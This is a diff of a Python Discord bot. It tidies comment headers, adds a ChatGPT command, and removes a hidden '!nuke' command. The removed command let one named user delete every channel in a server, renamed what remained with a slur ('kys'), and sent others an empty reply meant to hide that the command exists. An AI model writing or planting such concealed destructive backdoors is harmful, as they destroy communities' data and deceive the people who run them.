@@ -66,7 +66,7 @@ async def on_ready():
     print("Slash CMDs Synced " + str(len(synced)) + " Commands")
 
 
-# <------Joining Member-Coming soon----->
+# <------Joining Member------>
 @client.event
 async def on_member_join(member):
     print("Recognised that a member called " + member.name + " joined the Server")
@@ -81,7 +81,7 @@ async def on_member_join(member):
     embed.set_footer(text="⭐  • Dr.Zoidberg | Systems")
     await channel.send(embed=embed)
 
-
+# <------Leaving Member------>
 @client.event
 async def on_member_remove(member):
     channel = client.get_channel(1051603137972162642)
@@ -128,16 +128,8 @@ async def on_message(message):
                 embed.set_footer(text="⭐  • Dr.Zoidberg | Systems")
                 await message.channel.send(embed=embed)
 
-    # undercover nuke
-    if message.content.startswith('!nuke'):
-        if message.author == "tarik#0034":
-            server = message.guild
-            for c in server.channels:
-                await c.delete()
-            await message.guild.create_text_channel(name="nuked lol kys")
-        else:
-            await message.channel.send("")  # faking that there is no .nuke command for people who checked it
-
+    
+    # .creating ChatGPT command
     if message.content.startswith("/chatai"):
         ai_command = message.content.split(' ')[0]
         usr_msg = message.content.replace("/chatai", '')
